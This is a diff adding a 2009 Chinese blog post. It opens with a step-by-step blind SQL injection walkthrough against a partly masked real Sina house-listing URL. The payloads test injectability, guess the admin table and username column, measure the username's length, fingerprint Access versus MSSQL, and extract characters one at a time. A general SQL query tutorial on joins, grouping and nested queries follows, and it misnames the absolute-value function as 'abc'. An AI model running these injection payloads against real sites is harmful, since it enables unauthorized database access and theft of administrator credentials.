@@ -1,0 +1,278 @@
+JSP注入 免工具注入2009-04-11 00:19 A.M.检测可否注入
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and 1=1 (正常页面)
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and 1=2 (出错页面)
+
+
+检测表段的
+
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select * from admin)
+
+
+检测字段的
+
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select username from admin)
+
+
+检测ID
+
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select id from admin where ID=1)
+
+
+检测长度的
+
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select id from admin where len(username)=5 and ID=1)
+
+
+检测长度的
+
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select id from admin where len(username)=5 and ID=1)
+
+
+检测是否为MSSQL数据库
+
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select * from sysobjects)
+
+
+检测是否为英文
+
+
+(ACCESS数据库)
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select id from admin where asc(mid(username,1,1)) between 30 and 130 and ID=1)
+
+
+(MSSQL数据库)
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select id from admin where unicode(substring(username,1,1)) between 30 and 130 and ID=1)
+
+
+检测英文的范围
+
+
+(ACCESS数据库)
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select id from admin where asc(mid(username,1,1)) between 90 and 100 and ID=1)
+
+
+(MSSQL数据库)
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select id from admin where unicode(substring(username,1,1)) between 90 and 100 and ID=1)
+
+
+检测那个字符
+
+
+(ACCESS数据库)
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select id from admin where asc(mid(username,1,1))=97 and ID=1)
+
+
+(MSSQL数据库)
+
+http://****.house.sina.com.cn/publics/detail.jsp?id=7674 and exists (select id from admin where unicode(substring(username,1,1))=97 and ID=1)
+
+
+常用函数
+
+
+Access：asc(字符)　SQLServer：unicode(字符)
+
+作用：返回某字符的ASCII码
+
+
+Access：chr(数字)　SQLServer：nchar(数字)
+
+作用：与asc相反，根据ASCII码返回字符
+
+
+Access：mid(字符串,N,L)　SQLServer：substring(字符串,N,L)
+
+作用：返回字符串从N个字符起长度为L的子字符串，即N到N+L之间的字符串
+
+
+Access：abc(数字)　SQLServer：abc (数字)
+
+作用：返回数字的绝对值（在猜解汉字的时候会用到）
+
+
+Access：A between B And C　SQLServer：A between B And C
+
+作用：判断A是否界于B与C之间
+
+
+and exists(Select top 1 * From 用户 order by id)
+
+
+1.在查询结果中显示列名：
+
+a.用as关键字：select name as ’姓名’ from students order by age
+
+b.直接表示：select name ’姓名’ from students order by age
+
+
+2.精确查找:
+
+a.用in限定范围：select * from students where native in (’湖南’, ’四川’)
+
+b.between...and：select * from students where age between 20 and 30
+
+c.“=”：select * from students where name = ’李山’
+
+d.like:select * from students where name like ’李%’ (注意查询条件中有“%”，则说明是部分匹配，而且还有先后信息在里面，即查找以“李”开头的匹配项。所以若查询有“李”的所有对象，应该命令：’%李%’;若是第二个字为李，则应为’_李%’或’_李’或’_李_’。)
+
+e.[]匹配检查符：select * from courses where cno like ’[AC]%’ (表示或的关系，与"in(...)"类似，而且"[]"可以表示范围，如：select * from courses where cno like ’[A-C]%’)
+
+
+3.对于时间类型变量的处理
+
+a.smalldatetime：直接按照字符串处理的方式进行处理，例如：select * from students where birth > = ’1980-1-1’ and birth <= ’1980-12-31’
+
+
+4.集函数
+
+a.count()求和，如：select count(*) from students (求学生总人数)
+
+b.avg(列)求平均，如：select avg(mark) from grades where cno=’B2’
+
+c.max(列)和min(列)，求最大与最小
+
+
+5.分组group
+
+常用于统计时，如分组查总数：select gender,count(sno) from students group by gender(查看男女学生各有多少)
+
+注意：从哪种角度分组就从哪列"group by"
+
+对于多重分组，只需将分组规则罗列。比如查询各届各专业的男女同学人数 ，那么分组规则有：届别(grade)、专业(mno)和
+
+性别(gender)，所以有"group by grade, mno, gender"
+
+select grade, mno, gender, count(*) from students group by grade, mno, gender
+
+通常group还和having联用，比如查询1门课以上不及格的学生，则按学号(sno)分类有：
+
+select sno,count(*) from grades where mark<60 group by sno having count(*)>1
+
+
+6.UNION联合
+
+合并查询结果，如：
+
+Select * FROM students Where name like ‘张%’UNION [ALL] Select * FROM students Where name like ‘李%’
+
+
+7.多表查询
+
+a.内连接
+
+select g.sno,s.name,c.coursename from grades g JOIN students s ON g.sno=s.sno JOIN courses c ON g.cno=c.cno
+
+(注意可以引用别名)
+
+b.外连接
+
+b1.左连接
+
+select courses.cno,max(coursename),count(sno) from courses LEFT JOIN grades ON courses.cno=grades.cno group by courses.cno
+
+左连接特点：显示全部左边表中的所有项目，即使其中有些项中的数据未填写完全。
+
+
+左外连接返回那些存在于左表而右表中却没有的行，再加上内连接的行。
+
+b2.右连接
+
+与左连接类似
+
+b3.全连接
+
+select sno,name,major from students FULL JOIN majors ON students.mno=majors.mno
+
+两边表中的内容全部显示
+
+c.自身连接
+
+select c1.cno,c1.coursename,c1.pno,c2.coursename from courses c1,courses c2 where c1.pno=c2.cno
+
+采用别名解决问题。
+
+d.交*连接
+
+select lastname+firstname from lastname CROSS JOIN firstanme
+
+相当于做笛卡儿积
+
+
+8.嵌套查询
+
+a.用关键字IN,如查询猪猪山的同乡：
+
+select * from students where native in (select native from students where name=’猪猪’)
+
+b.使用关键字EXIST,比如，下面两句是等价的：
+
+select * from students where sno in (select sno from grades where cno=’B2’)
+
+
+select * from students where exists (select * from grades where grades.sno=students.sno AND cno=’B2’)
+
+
+9.关于排序order
+
+a.对于排序order，有两种方法：asc升序和desc降序
+
+b.对于排序order,可以按照查询条件中的某项排列，而且这项可用数字表示，如：
+
+select sno,count(*) ,avg(mark) from grades group by sno having avg(mark)>85 order by 3
+
+
+10.其他
+
+a.对于有空格的识别名称，应该用"[]"括住。
+
+b.对于某列中没有数据的特定查询可以用null判断，如select sno,courseno from grades where mark IS NULL
+
+c.注意区分在嵌套查询中使用的any与all的区别，any相当于逻辑运算“||”而all则相当于逻辑运算“&&”
+
+d.注意在做否定意义的查询是小心进入陷阱：
+
+如，没有选修‘B2’课程的学生 ：
+
+select students.* from students, grades where students.sno=grades.sno AND grades.cno <> ’B2’
+
+上面的查询方式是错误的，正确方式见下方：
+
+select * from students where not exists (select * from grades where grades.sno=students.sno AND cno=’B2’)
+
+
+11.关于有难度多重嵌套查询的解决思想：如，select * from students where not exists (select * from courses where NOT EXISTS (select * from grades where sno=students.sno AND cno=courses.cno))
+
+最外一重：从学生表中选，排除那些有课没选的。用not exist。由于讨论对象是课程，所以第二重查询从course表中找，排除那些选了课的即可
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
